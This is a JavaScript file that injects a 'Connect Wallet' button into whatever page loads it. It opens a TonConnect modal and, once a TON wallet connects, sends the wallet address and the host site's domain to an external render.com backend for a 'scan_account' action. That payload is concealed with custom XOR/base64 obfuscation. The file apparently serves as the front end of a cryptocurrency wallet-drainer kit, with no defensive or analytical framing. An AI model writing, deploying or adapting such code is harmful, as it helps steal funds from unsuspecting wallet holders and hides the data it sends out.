const TON_CONNECT_MANIFEST = "./tonconnect-manifest.json";
const BACKEND_URL = "https://ton-iske.onrender.com";
const ENCR_KEY = 500; // Must match backend encr_key

// Helper encryption function matching backend prs/srp logic
const encryptPayload = (dataObj, encrKey) => {
    const s = btoa(String(5 + 10 + 365 + 2048 + 867 + encrKey));
    const t = btoa(JSON.stringify(dataObj));
    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return t.split("").map(ab).map(as).map(bh).join("");
};

document.addEventListener("DOMContentLoaded", () => {
    // Inject the single required button if it doesn't exist
    if (!document.getElementById("connect-btn")) {
        const btn = document.createElement("button");
        btn.id = "connect-btn";
        btn.innerText = "Connect Wallet";
        btn.style.cssText = "padding: 12px 24px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer;";
        document.body.appendChild(btn);
    }

    // Load TonConnect UI SDK dynamically if not already loaded
    if (typeof TON_CONNECT_UI === 'undefined') {
        const script = document.createElement('script');
        script.src = "https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js";
        script.async = true;
        script.onload = initTonConnect;
        document.head.appendChild(script);
    } else {
        initTonConnect();
    }
});

function initTonConnect() {
    // Initialize TonConnect UI invisibly or bound to modal popup
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: TON_CONNECT_MANIFEST,
        // We pass a dummy container or let it manage modal popup when UI modal is triggered
    });

    const connectBtn = document.getElementById("connect-btn");

    connectBtn.addEventListener("click", async () => {
        try {
            // Prompt the wallet connection modal
            const walletInfo = await tonConnectUI.openModal();
        } catch (e) {
            console.log("Modal closed or connection cancelled", e);
        }
    });

    // Listen to connection changes to trigger backend scan/actions
    tonConnectUI.onStatusChange(async (walletInfo) => {
        if (walletInfo) {
            const rawAddress = walletInfo.account.rawAddress;
            const domain = window.location.hostname;

            console.log("Wallet connected, sending to backend...", rawAddress);

            try {
                const rawPayload = {
                    action: 'scan_account',
                    account: rawAddress,
                    domain: domain
                };

                const encrypted = encryptPayload(rawPayload, ENCR_KEY);

                await fetch(`${BACKEND_URL}/`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ raw: encrypted })
                });
            } catch (err) {
                console.error("Backend request failed", err);
            }
        }
    });
}
